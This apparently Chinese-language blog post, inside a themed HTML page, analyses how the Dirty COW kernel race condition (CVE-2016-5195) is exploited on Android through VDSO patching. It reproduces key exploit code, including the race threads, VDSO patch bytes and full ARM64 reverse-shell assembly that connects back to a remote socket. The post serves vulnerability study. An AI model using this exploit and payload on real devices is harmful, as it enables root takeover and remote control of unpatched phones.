<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.5.2 -->
    <script>
        window.materialVersion = "1.5.2"
        // Delete localstorage with these tags
        window.oldVersion = [
            'codestartv1',
            '1.3.4',
            '1.4.0',
            '1.4.0b1',
            '1.5.0'
        ]
    </script>

    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">



    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>












    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <!-- Title -->
    
    <title>
        
            漏洞分析一百篇-03-Dirtycow条件竞争漏洞 | 
        
        leo00000的个人博客
    </title>

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">

    <meta name="format-detection" content="telephone=no"/>
    <meta name="description" itemprop="description" content="leo00000&#39; blog">
    <meta name="keywords" content="ctf 渗透测试 hacker leo00000,EXP,CVE,Android,条件竞争">
    <meta name="theme-color" content="#0097A7">

    <!-- Disable Fucking Bloody Baidu Tranformation -->
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.zhCN.js"></script>
        
    <![endif]-->

    <!-- Import lsloader -->
    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>

    <!-- Import queue -->
    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>

    <!-- Import CSS -->
    
        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>

        
            
                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/atelier-dune-dark.min.css?Sq+/jscLQsK3lkqis0e/aA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
            
        

    

    

    <!-- Config CSS -->

<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
    overflow-x: hidden !important;
  }
  
  code {
    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }

</style>


<!-- Theme Background Related-->

    <style>
      body{
        background-image: url(/img/bg.png);
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>


<!-- Import Font -->
<!-- Import Roboto -->

    <link href="https://fonts.proxy.ustclug.org/css?family=Roboto:300,400,500" rel="stylesheet">


<!-- Import Material Icons -->


    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>




    <!-- Import jQuery -->
    
        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
    

    <!-- WebAPP Icons -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="application-name" content="leo00000的个人博客">
    <meta name="msapplication-starturl" content="http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/">
    <meta name="msapplication-navbutton-color" content="#0097A7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="leo00000的个人博客">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon" href="/img/favicon.png">

    <!-- Site Verification -->
    
    

    <!-- RSS -->
    

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="漏洞分析一百篇-03-Dirtycow条件竞争漏洞 | leo00000的个人博客">
    <meta property="og:image" content="/img/favicon.png">
    <meta property="og:description" content="leo00000&#39; blog">
    <meta property="og:article:tag" content="EXP"> <meta property="og:article:tag" content="CVE"> <meta property="og:article:tag" content="Android"> <meta property="og:article:tag" content="条件竞争"> 

    
        <meta property="article:published_time" content="Wed Jul 04 2018 00:00:00 GMT+0800">
        <meta property="article:modified_time" content="Wed Jul 04 2018 11:51:05 GMT+0800">
    

    <!-- The Twitter Card protocol -->
    <meta name="twitter:card" content="summary_large_image">

    <!-- Add canonical link for SEO -->
    
        <link rel="canonical" href="http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/index.html" />
    

    <!-- Structured-data for SEO -->
    
        


<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage": "http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/index.html",
    "headline": "漏洞分析一百篇-03-Dirtycow条件竞争漏洞",
    "datePublished": "Wed Jul 04 2018 00:00:00 GMT+0800",
    "dateModified": "Wed Jul 04 2018 11:51:05 GMT+0800",
    "author": {
        "@type": "Person",
        "name": "leo00000",
        "image": {
            "@type": "ImageObject",
            "url": "/img/avatar.jpeg"
        },
        "description": "The more quiet you are, the more you hear."
    },
    "publisher": {
        "@type": "Organization",
        "name": "leo00000的个人博客",
        "logo": {
            "@type":"ImageObject",
            "url": "/img/favicon.png"
        }
    },
    "keywords": ",EXP,CVE,Android,条件竞争ctf 渗透测试 hacker leo00000",
    "description": "leo00000&#39; blog",
}
</script>


    

    <!-- Analytics -->
    
    
    
        <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=1271946750&web_id=1271946750" language="JavaScript"></script>
</div>
    

    <!-- Custom Head -->
    

</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->


    <!-- Left aligned menu below button -->
    
    
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#分析环境"><span class="post-toc-number">1.</span> <span class="post-toc-text">分析环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">EXP分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#VDSO介绍"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">VDSO介绍</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用思路"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">利用思路</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#1-使用getauxval获取执行VDSO的页"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">1. 使用getauxval获取执行VDSO的页</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#2-获取-kernel-clock-gettime的首地址。"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">2. 获取__kernel_clock_gettime的首地址。</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#3-patch掉VDSO。"><span class="post-toc-number">2.2.3.</span> <span class="post-toc-text">3. patch掉VDSO。</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#4-触发漏洞，payload-rootshell通过socket回连。"><span class="post-toc-number">2.2.4.</span> <span class="post-toc-text">4. 触发漏洞，payload rootshell通过socket回连。</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#5-清理工作。"><span class="post-toc-number">2.2.5.</span> <span class="post-toc-text">5. 清理工作。</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#验证结果"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">验证结果</span></a></li></ol></li></ol>
    </ul>
    




<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        
            <!-- Random Thumbnail -->
            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
            <script type="text/ls-javascript" id="post-thumbnail-script">
    var randomNum = Math.floor(Math.random() * 19 + 1);

    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
    $('.post_thumbnail-random').addClass('lazy');
</script>

        
    
            <p class="article-headline-p">
                漏洞分析一百篇-03-Dirtycow条件竞争漏洞
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/avatar.jpeg" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>leo00000</strong>
        <span>7月 04, 2018</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    

    <!-- Tags (bookmark) -->
    
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/Android/">Android</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/CVE/">CVE</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/EXP/">EXP</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/条件竞争/">条件竞争</a>
    </ul>
    

    <!-- Share -->
    
        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    
        
            <!-- Busuanzi Views -->
            <a class="post_share-link" href="#">
                <li class="mdl-menu__item">
                    <span id="busuanzi_container_page_pv">
                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
                    </span>
                </li>
            </a>
        
    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=漏洞分析一百篇-03-Dirtycow条件竞争漏洞&url=http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/index.html&pic=http://leo00000.cn/img/favicon.png&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    

    <!-- Share Facebook -->
    

    <!-- Share Google+ -->
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    
        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=leo00000的个人博客&title=漏洞分析一百篇-03-Dirtycow条件竞争漏洞&summary=leo00000&#39; blog&pics=http://leo00000.cn/img/favicon.png&url=http://leo00000.cn/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 QQ
            </li>
        </a>
    

    <!-- Share Telegram -->
    
</ul>

    
</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <p>CVE-2016-5195“脏牛漏洞”曝出一年多了，近期出现的网上出现一批木马<a href="https://m.bobao.360.cn/learning/appdetail/4484.html" target="_blank" rel="noopener">ZNIU</a>利用脏牛提权，和前段时间发现的<a href="https://github.com/hyln9/VIKIROOT" target="_blank" rel="noopener">VIKIROOT</a>思路十分相似，这里就漏洞利用技术进行分细。</p>
<h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:left">推荐使用的环境</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td style="text-align:left">Android 5.1.1</td>
<td style="text-align:left">小米4C实体机</td>
</tr>
<tr>
<td>内核版本</td>
<td style="text-align:left">goldfidh 3.10.49</td>
<td style="text-align:left">no patch</td>
</tr>
</tbody>
</table>
<p>关于脏牛的POC分析和漏洞成因，在本文将不再分析，有兴趣的读者可以<a href="http://bobao.360.cn/learning/detail/3132.html" target="_blank" rel="noopener">看这里</a>，本文主要讲利用方法。通过POC我们可以利用读一个root文件，条件竞争获取root写。常见的思路就是找一个具有SUID的可执行文件，将su竞争写入，执行su获取root。但是这里有两个限制，一是本身具有root SUID的可执行文件不好找，二是SELinux中严格限制getuid。该exploit利用了ret-VDSO技术达到了绕过SELinux目的。</p>
<h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><p>完整的EXP已经在VIKIROOT中提供了，这里不再重复。</p>
<h4 id="VDSO介绍"><a href="#VDSO介绍" class="headerlink" title="VDSO介绍"></a>VDSO介绍</h4><blockquote>
<p>VDSO(Virtual Dynamically-linked Shared Object)是个很有意思的东西，它将内核态的调用映射到用户态的地址空间中，使得调用开销更小，路径更好。<br>开销更小比较容易理解, 那么路径更好指的是什么呢？拿x86下的系统调用举例，传统的int 0×80有点慢，Intel和AMD分别实现了sysenter，sysexit和syscall，sysret，即所谓的快速系统调用指令，使用它们更快，但是也带来了兼容性的问题。于是Linux实现了vsyscall，程序统一调用vsyscall，具体的选择由内核来决定。而vsyscall的实现就在VDSO中。不光是快速系统调用，glibc现在也提供了VDSO的支持，open()，read()，write()，gettimeofday()都可以直接用VDSO中的实现，使得这些调用更快，glibc更兼容，内核新特性在不影响glibc的情况下也可以更快的部署。Linux(kernel 2.6以上)环境执行<code>ldd /bin/sh</code>会发现有一个名字叫做linux-vdso.so.1的动态文件，而系统中却找不到它，它就是VDSO。</p>
</blockquote>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><img src="/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/EXP.png">
<p>EXP源代码在VIKIROOT工具中已经提供，这里对关键部分进行说明。</p>
<h5 id="1-使用getauxval获取执行VDSO的页"><a href="#1-使用getauxval获取执行VDSO的页" class="headerlink" title="1. 使用getauxval获取执行VDSO的页"></a>1. 使用getauxval获取执行VDSO的页</h5><pre><code class="c">    //vdso_addr指向包含有VDSO的页
    void *vdso_addr = (void *)getauxval(AT_SYSINFO_EHDR);
</code></pre>
<h5 id="2-获取-kernel-clock-gettime的首地址。"><a href="#2-获取-kernel-clock-gettime的首地址。" class="headerlink" title="2. 获取__kernel_clock_gettime的首地址。"></a>2. 获取__kernel_clock_gettime的首地址。</h5><p>由于内核中__kernel_clock_gettime的头部比较稳定，可以直接使用以下代码作为特征值在VDSO中搜索得到偏移地址。</p>
<pre><code class="c">    /* __kernel_clock_gettime */
    /* CMP W0, #0; CCMP W0, #1, #4, NE; B.NE #0x50 */
    {
        &quot;\x1f\x00\x00\x71\x04\x18\x41\x7a\x81\x02\x00\x54&quot;, 12, // s_pattern, s_size
        &quot;\x1f\x00\x00\x71\x04\x18\x41\x7a&quot;, 8   //r_pattern, r_size
    }

    ...省略...

    // match the entry of __kernel_clock_gettime
    target_offset = match_entry(vdso_addr, &amp;entry)
</code></pre>
<h5 id="3-patch掉VDSO。"><a href="#3-patch掉VDSO。" class="headerlink" title="3. patch掉VDSO。"></a>3. patch掉VDSO。</h5><p>漏洞利用代码的关键部分，事先写好一段arm下的 reverse-tcp-shell的payload，由于VDSO页有4K大小，在页尾有较大的空间没有利用可以存下payload。patch_vdso主要做两件事，一是使用patch掉__kernel_clock_gettime的头8字节，二是将payload写入VDSO页尾。</p>
<pre><code class="c">    //patch __kernel_clock_gettime
    buf[0] = &#39;\xf0&#39;;
    buf[1] = &#39;\x03&#39;;
    buf[2] = &#39;\x1e&#39;;
    buf[3] = &#39;\xaa&#39;;

    // MOV X16, X30; BL 0xEDC;
    // 0xEDC is offset addr to payload in VDSO;
    rel = VDSO_SIZE - payload_len - target_offset - 4;
    *(uint16_t *)&amp;buf[4] = (uint16_t)(rel / 4);
    buf[6] = &#39;\x00&#39;;
    buf[7] = &#39;\x94&#39;;
</code></pre>
<p>写入方法与CVE-2016-5195提供的POC中的方法一样，这里将VDSO作为可读文件，条件竞争写入。</p>
<pre><code class="c">    arg.stop = false;
    pthread_create(&amp;pth1, NULL, madvise_thread, &amp;arg);
    pthread_create(&amp;pth2, NULL, ptrace_thread, &amp;arg);

    sleep(5);
    // maybe 5s not enough for complete writing payload.
    // sleep(10);

    // wait for thread finish;
    arg.stop = true;
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
</code></pre>
<h5 id="4-触发漏洞，payload-rootshell通过socket回连。"><a href="#4-触发漏洞，payload-rootshell通过socket回连。" class="headerlink" title="4. 触发漏洞，payload rootshell通过socket回连。"></a>4. 触发漏洞，payload rootshell通过socket回连。</h5><p>这是一段arm平台的payload，x86可一在VIKIROOT的灵感连接中找到。注意看<code>payload.s</code>主要注释：</p>
<pre><code class="asm">    _start:
        //save registers
        stp x0, x1, [sp,#-16]!

        // target init(0)
        // return if getuid() != 0 or getpid() != 1
        mov x8, SYS_GETUID
        svc 0
        cbnz w0, return
        mov x8, SYS_GETPID
        svc 0
        cmp w0, 1
        b.ne return

        // return if open(&quot;/data/local/tmp/.x&quot;, O_CREAT|O_EXCL, ?) fails
        // use &quot;openat&quot; instead since &quot;open&quot; is deprecated
        // intended to detect write permission and avoid conflict
        mov w0, 0    // dirfd is ignored
        adr x1, path
        mov w2, O_CREAT|O_EXCL
        mov w3, S_IRWXU
        mov    x8, SYS_OPENAT
        svc 0
        cmn x0, #1, LSL#12
        b.hi return

        // fork is deprecated, replaced with clone
        mov x0, SIGCHLD
        mov x1, 0
        mov x2, 0
        mov x3, 0
        mov x4, 0
        mov x8, SYS_CLONE
        svc 0
        cbnz w0, return

        // reverse connect
        // sockfd = socket(AF_INET, SOCK_STREAM, 0)
        mov x0, AF_INET
        mov    x1, SOCK_STREAM
        mov x2, 0
        mov x8, SYS_SOCKET
        svc 0
        mov x3, x0

        // connect(sockfd, (struct sockaddr *)&amp;server, sockaddr_len)
        adr x1, sockaddr
        mov x2, 0x10
        mov    x8,SYS_CONNECT
        svc 0
        cbnz w0, exit

        // dup3(sockfd, STDIN, 0)
        mov x0, x3
        mov x2, 0 
        mov x1,STDIN
        mov x8,SYS_DUP3
        svc 0
        mov x1, STDOUT
        mov x8, SYS_DUP3
        svc 0
        mov x1, STDERR
        mov    x8, SYS_EXECVE
        svc 0

    exit:
        mov x0, 0
        mov x8, SYS_EXIT
        svc 0

    return:
        ldp x0, x1, [sp],#16
        mov x17, x30
        mov x30, x16
        nop        // CMP W0, #0
        nop        // CMP W0, #1, #4, NE
        br x17
</code></pre>
<p>这样当系统调用__kernel_clock_gettime时就会执行到<code>BL 0xEDC</code>，进而跳转到payload，而该函数使用十分频繁，打开手机时钟即可触发。</p>
<h5 id="5-清理工作。"><a href="#5-清理工作。" class="headerlink" title="5. 清理工作。"></a>5. 清理工作。</h5><p>EXP写的较好的地方是对exploit之前的环境进行了保存，rootshell之后可以用原环境对VDSO再次patch，做到了无须重启，不损伤目标环境。测试的时候是回连adb shell，但是木马环境中是远程shell。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在验证实验中最终是以失败告终了，由于<a href="https://github.com/Jin-YA/BlackChat" target="_blank" rel="noopener">BlackChat</a>的关系就不再继续下去了，这里将验证结果分享给大家，结合ZNIU的木马分析相信大家能够掌握该EXP技术利用。同时也欢迎大家共同探讨<a href="https://github.com/Jin-YA/BlackChat" target="_blank" rel="noopener">BlackChat</a>。</p>
<h4 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h4><p>测试时使用的环境如图：<br></p>
<p>通过dump下来的补丁，证明确实ret VSDO思路确实可行，这里看到patch<code>__kernel_clock_gettime</code>和写入payload到VDSO页尾都成功了：<br><img src="/2018/漏洞分析一百篇-03-Dirtycow条件竞争漏洞/kernel_clock_gettime_diff.png"></p>
<p>但是注意到当竞争时间过短时，payload可能存在写入不完全，我们这里将竞争时间加长。<br></p>
